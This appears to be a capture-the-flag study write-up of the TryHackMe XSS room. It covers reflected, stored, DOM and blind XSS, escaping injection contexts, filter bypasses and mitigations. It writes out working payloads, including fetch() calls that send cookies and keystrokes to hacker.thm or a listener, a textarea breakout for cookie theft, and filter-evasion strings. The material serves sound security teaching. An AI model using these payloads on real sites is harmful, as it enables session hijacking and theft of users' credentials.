# Cross-Site Scripting (XSS)

Getting the victim's **browser** to run attacker-supplied JavaScript in the context of a trusted site. This room walks the full picture: the terminology, what a payload actually *does*, the four flavours (reflected, stored, DOM, blind), a six-level practical on escaping different injection contexts and beating filters, and how developers stop it.

> This is the **TryHackMe "Cross-Site Scripting" room**. Scenario: pentest an internal web app with a public comments section, a user dashboard, and a news search — find the XSS before it's used for data exfiltration. Labs use "Atlas News" (Flask) and "Acme IT Support".
>
> 🔗 Sibling lab in this folder: [SQLi](SQLi/SQL-Injection-Lab.md). Where SQLi attacks the **database**, XSS attacks the **other users' browsers**.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Terminology](#terminology)
- [Anatomy of a payload](#anatomy-of-a-payload)
- [What payloads are used for](#what-payloads-are-used-for)
- [Reflected XSS](#reflected-xss)
- [Stored XSS](#stored-xss)
- [DOM-based XSS](#dom-based-xss)
- [Blind XSS](#blind-xss)
- [Escaping the context: the six-level practical](#escaping-the-context-the-six-level-practical)
- [Beating filters](#beating-filters)
- [Polyglots](#polyglots)
- [Mitigation](#mitigation)
- [Key takeaways](#key-takeaways)

---

## In plain English

A website is supposed to treat what you type as **text** to display. XSS is when you type something that the browser instead treats as **code** and runs. Because that code runs *inside the trusted site's page*, it can do anything the real page's JavaScript could — read the session cookie, click buttons as the user, change their email, log their keystrokes.

The whole game is: **your input lands somewhere in the page's HTML/JS, and you shape it so the browser executes it instead of showing it.**

| Type | Where the payload lives | Who it hits | One-line hook |
| --- | --- | --- | --- |
| **Reflected** | Bounced straight back from your request (URL/form) | Whoever clicks your crafted link | "Echoed once, runs once." |
| **Stored** | Saved on the server (comment, profile, ticket) | *Every* visitor who views that content | "Plant once, fires for everyone." |
| **DOM-based** | Never reaches the server — client JS reads it and writes it unsafely | Whoever opens the crafted URL | "Server never sees it; the browser does it to itself." |
| **Blind** | Stored, but you can't see it fire | A staff member / admin viewing it later | "Fires out of sight — you need a callback to know." |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>XSS</strong> = Cross-Site Scripting — running your JS in someone else's page. <strong>Payload</strong> = the JS snippet you inject. <strong>DOM</strong> = the browser's live tree of the page that JS reads and edits. <strong>Sink</strong> = a dangerous place that turns data into live code/HTML (e.g. <code>innerHTML</code>, <code>eval</code>, <code>document.write</code>). <strong>Source</strong> = an attacker-controllable input (URL, <code>location.hash</code>, a form field). <strong>Escaping / output encoding</strong> = turning <code>&lt;</code> into <code>&amp;lt;</code> so the browser shows it as text instead of running it. <strong>HttpOnly</strong> = a cookie flag that hides the cookie from JavaScript (so XSS can't read it).
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not rote memorisation. Remember the four hooks in the table and the one idea that ties everything together — <em>match your payload to the context your input lands in</em> (raw HTML? inside an attribute? inside a JS string? inside a <code>&lt;textarea&gt;</code>?). The exact escape characters follow from that.
</div>

---

## Terminology

- **Document Object Model (DOM)** — the browser's live, structured (tree) representation of the page: tags, text, attributes. JavaScript reads and changes the DOM, and the visible page updates instantly. It's the page's in-memory blueprint.
- **URL parameters (query string)** — the bits after `?`, e.g. `https://site.com/search?q=hello` has parameter `q` = `hello`. **User-controllable** (typed in the address bar, or carried by links/forms) → always treat as untrusted.
- **JavaScript** — the language that runs in the browser. XSS payloads are small JS snippets that run in the victim's page context: they can read/modify the DOM, make network requests, and read cookies (unless protected).
- **Cookies** — small data stored in the browser (session IDs, preferences). If a cookie is readable by JS *and* an attacker can run JS via XSS, they can steal it and hijack the session. **`HttpOnly`** blocks JS from reading it.
- **Escaping (output encoding)** vs **filtering (input validation):**
  - *Escaping* transforms user data so the browser treats it as **plain text**, e.g. `<script>` → `&lt;script&gt;` (harmless text).
  - *Filtering* checks the input *looks* allowed (letters, numbers, length) but does **not** stop data from becoming code once it's placed into a page.
  - Escaping is the reliable defence; a filter alone is not.

---

## Anatomy of a payload

An XSS payload has two parts:

1. **Intention** — what you want the code to do (prove execution, steal cookies, log keys, act as the user).
2. **Modification** — reshaping it so it actually *executes* in the specific spot where your input is reflected. You often must break out of an HTML tag, an attribute, or a JS block first.

> Pentesters rarely reuse one payload everywhere — you adjust it to how the input is reflected. **Context decides the payload.**

**Confirming XSS** — start with a harmless proof:

```html
<script>alert('XSS')</script>
```

If a pop-up appears, JavaScript runs → it's vulnerable. Then swap in something useful.

**Common injection points:** search fields, comment sections, profile names, feedback forms, URL parameters. Example — a search page that reflects input:

```text
https://site.thm/search?q=hello   →   "You searched for: hello"
```

Supplying `<script>alert(1)</script>` as `q`, if unsanitised, runs in the browser.

---

## What payloads are used for

| Intention | Payload | Effect |
| --- | --- | --- |
| **Proof of concept** | `<script>alert('XSS')</script>` | Confirms JS executes. |
| **Session stealing** | `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` | Sends the victim's cookies to the attacker (`btoa()` base64-encodes them for safe transport). |
| **Key logger** | `<script>document.onkeypress = function(e){ fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>` | Exfiltrates every keypress (usernames, passwords, card numbers). |
| **Business logic** | `<script>user.changeEmail('attacker@hacker.thm');</script>` | Abuses an existing app function — change the email, then trigger a password reset → account takeover. |

---

## Reflected XSS

The app takes input (query string, form field, header) and **immediately echoes it into the page without sanitising**. The attacker crafts a malicious link/form and gets a victim to click it; the site "reflects" the input, so the browser runs it in the site's origin. Common in search boxes, error messages, any page echoing URL/POST params.

**Practical (Atlas News, `http://TARGET:5000`):** search box reads the `q` parameter and renders it back. A normal search of `product` shows "You searched for: product". Instead inject:

```html
<script>alert('Hack')</script>
```

→ pop-up fires; the value from the URL executes in the browser.

**Root cause** — the handler passes the raw parameter into the template:

```python
q = request.args.get("q", "")          # source of untrusted data
return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)
```

`query` (raw) is rendered instead of `query_escaped`.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why reflected still matters despite needing a click:</strong> the malicious value lives in a URL you send the victim (email, chat, ad). One click and it runs with <em>their</em> session on the real site — it just doesn't persist for other users the way stored does.
</div>

---

## Stored XSS

The app **saves** attacker input on the server (usually a database) and later serves it to other users **without escaping**, so the script runs in *every* visitor's browser. More impactful than reflected because it persists and can hit many users, including admins. Typical homes: comments, profiles/bios, message boards, product reviews, file-upload metadata.

**Practical (Guestbook, `/guestbook`):** submit the comment:

```html
<script>alert('You are Hacked')</script>
```

It's saved; reload (or any visitor loads the page) → the alert fires for everyone.

**Root cause** — the template renders attacker input as raw HTML, bypassing auto-escaping:

```jinja
{{ query|safe }}      {{ c.comment|safe }}
```

Jinja's `|safe` disables escaping, so stored `<script>` runs. Treating untrusted input as "already safe" is the bug.

---

## DOM-based XSS

The vulnerability is **entirely client-side**: JavaScript reads attacker-controllable data from the DOM (`location.hash`, `location.search`, `document.referrer`, `localStorage`, etc.) and writes it back into the page through a **dangerous sink** (`innerHTML`, `document.write`, `eval`). The payload **never touches the server**, so server-side defences don't help.

**Practical (News Preview, `/dom`):** in the "Manual preview" field paste:

```html
<img src=x onerror="alert('Hacked you again')">
```

Click Preview → pop-up. (`<img src=x>` fails to load an image named `x`, which fires the `onerror` handler — a classic way to run JS without a `<script>` tag.)

**Root cause** — client JS reads the fragment and does `element.innerHTML = value`, so the browser parses and executes the injected `<img onerror=...>`. The fix is to treat the value as **text** (`textContent`) or sanitise it, not feed it to `innerHTML`.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info — <code>&lt;script&gt;</code> won't run via <code>innerHTML</code>:</strong> when you assign a string containing <code>&lt;script&gt;</code> to <code>innerHTML</code>, the browser parses it but does <em>not</em> execute it. That's why DOM XSS payloads lean on event handlers like <code>onerror</code>/<code>onload</code> on tags such as <code>&lt;img&gt;</code> or <code>&lt;svg&gt;</code>, which <em>do</em> run.
</div>

---

## Blind XSS

Like stored XSS — your payload is saved for another user to view — **but you can't see it fire or test it on yourself**. Classic setup: a contact form → messages become support tickets that staff view on a **private portal** you can't reach.

Because you get no visible feedback, your payload **must call back** to you (an HTTP request) so you know if/when it ran, and can exfiltrate what it sees (the portal URL, the staff cookies, the page contents). Tools like **XSS Hunter Express** automate capturing cookies/URLs/page content; you can also roll your own.

**Practical (Acme IT Support, `http://TARGET:8080`):** sign up as a customer, log in, open **Support Tickets → Create Ticket**. Viewing a ticket's source shows the entered text lands **inside a `<textarea>`**, so you must break out of it first.

**Step 1 — escape the `<textarea>`** (Ticket Subject):

```html
</textarea>test
```

Source confirms you've closed the tag.

**Step 2 — run JS:**

```html
</textarea><script>alert('THM');</script>
```

**Step 3 — exfiltrate cookies to a listener.** Start a listener on the AttackBox:

```bash
nc -nlvp 9001
# -n no DNS, -l listen, -v verbose, -p port
```

Then submit a ticket whose Subject is:

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>
```

Payload breakdown:

| Piece | Role |
| --- | --- |
| `</textarea>` | closes the text-area field |
| `<script>…</script>` | opens/closes the JS block |
| `fetch(...)` | makes the outbound HTTP request |
| `URL_OR_IP:PORT_NUMBER` | your Request Catcher URL, or your AttackBox/VPN IP + listener port |
| `?cookie=` | query string carrying the loot |
| `btoa(document.cookie)` | base64-encodes the victim's cookies for safe transit |

When a staff member opens the ticket, the request hits your listener with their cookie. Base64-decode it (e.g. base64decode.org) → hijack their session.

> Note: exfil can be flaky over a personal VM/VPN — use the AttackBox for this task.

---

## Escaping the context: the six-level practical

A second target (`http://TARGET`) drills the single most important XSS skill: **your payload depends on where your input lands in the source.** Goal each level is to fire `alert('THM')`.

| Level | Where input is reflected | Payload | The key move |
| --- | --- | --- | --- |
| **1** | Raw in the page body | `<script>alert('THM');</script>` | Nothing to escape — inject directly. |
| **2** | Inside an `<input value="...">` attribute | `"><script>alert('THM');</script>` | `">` closes the value **and** the input tag, then your script runs. |
| **3** | Inside a `<textarea>` | `</textarea><script>alert('THM');</script>` | `</textarea>` closes the element so the script executes. |
| **4** | Inside a JS string in existing code | `';alert('THM');//` | `'` ends the string, `;` ends the statement, `//` comments out the rest. |
| **5** | Body, but a filter strips the word `script` | `<sscriptcript>alert('THM');</sscriptcript>` | Filter deletes the inner `script`, leaving a valid `<script>`. |
| **6** | Inside an `<img src="...">`, `<` and `>` filtered | `/images/cat.jpg" onload="alert('THM');` | Can't add tags → break out of `src` and add an **event handler** (`onload`) that runs on image load. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>The whole lesson in one line:</strong> read the page source, see exactly what surrounds your reflected input (a tag body, an attribute, a JS string), and craft the minimum characters needed to <em>break out of that context</em> before your code. When tags are blocked, pivot to <strong>event-handler attributes</strong> (<code>onload</code>, <code>onerror</code>, <code>onmouseover</code>).
</div>

---

## Beating filters

Two reliable tricks when a naive filter tries to block XSS:

- **Nested/duplicated keywords** — if the filter removes a banned word *once*, hide it inside itself so a valid copy remains after removal:
  - `<sscriptcript>` → filter strips the inner `script` → leaves `<script>`. (Same idea works for `javascript`, `alert`, `onerror`, etc.)
- **No-`<script>` execution via event handlers** — when `<` / `>` or `script` are blocked but you're already inside a tag, use attributes that execute JS:
  - `onerror` on a broken `<img src=x>`, `onload` on an image/`<svg>`, `onmouseover`, `onfocus autofocus`, etc.

The root reason these work: **blocklists enumerate badness and always miss cases**; the browser has far more ways to run JS than a filter can list. That's why encoding output for the correct context — not filtering input — is the real fix.

---

## Polyglots

An **XSS polyglot** is a single string built to break out of **many contexts at once** (tag body, attribute, JS string) and slip past common filters — so it fires regardless of where it lands. One polyglot would have solved all six levels above. Handy for fast testing, but noisy/ugly; for a clean report, still identify the specific context and use the minimal payload.

---

## Mitigation

XSS is fixed on the **defender's** side by never letting untrusted data become executable code:

- **Context-aware output encoding** — encode data for the exact place it's inserted (HTML body, HTML attribute, JS string, URL, CSS). This is the primary defence; escaping `<`, `>`, `"`, `'`, `&` for HTML turns payloads into inert text.
- **Use the framework's auto-escaping — and don't disable it.** The labs were vulnerable precisely because they opted out: Jinja `{{ x|safe }}` and JS `innerHTML`. Prefer `{{ x }}` (auto-escaped) and `element.textContent` over `innerHTML`.
- **Avoid dangerous sinks** for untrusted data: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout('string')`. If you must render HTML, run it through a sanitiser like **DOMPurify**.
- **Content Security Policy (CSP)** — a response header that restricts where scripts may load from and can block inline scripts; a strong second layer that limits impact even if a payload slips through.
- **`HttpOnly` cookies** — stop JavaScript reading session cookies, defeating the cookie-theft payload (note it does **not** stop other XSS actions like acting as the user).
- **Input validation as defence-in-depth, not the main control** — constrain type/length/format, but never rely on a blocklist of "bad words"; the six-level lab shows how easily those are bypassed.

---

## Key takeaways

- **XSS = your JavaScript running in someone else's browser, in a trusted site's origin.** Once it runs it can read the DOM, steal non-`HttpOnly` cookies, keylog, and act as the user.
- **Four types by where the payload lives and who it hits:** reflected (echoed back, needs a click), stored (saved, hits everyone), DOM (client-side only, server never sees it), blind (stored + out of sight, needs a callback).
- **Context decides the payload.** Read the source, see whether you're in a tag body, an attribute, a JS string, or a `<textarea>`, and break out of exactly that before injecting.
- **When tags/keywords are filtered:** duplicate the banned word (`<sscriptcript>`) or pivot to **event handlers** (`onerror`/`onload`) — no `<script>` needed.
- **DOM XSS leans on event handlers** because `<script>` assigned via `innerHTML` won't execute.
- **Blind XSS needs exfiltration:** a `fetch()` (or an out-of-band tool like XSS Hunter) back to a listener (`nc -nlvp`) is how you learn it fired and grab the cookie.
- **Defence is output encoding + not disabling auto-escaping + CSP + `HttpOnly` + DOMPurify for HTML** — filtering input alone never holds.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>SQLi vs XSS in one line:</strong> both come from mixing untrusted input with a trusted context — SQLi mixes it into a <em>SQL query</em> (attacks the database), XSS mixes it into an <em>HTML/JS page</em> (attacks other users' browsers). The fix rhymes too: keep data and code separate — parameterized queries for SQL, context-aware encoding for HTML.
</div>
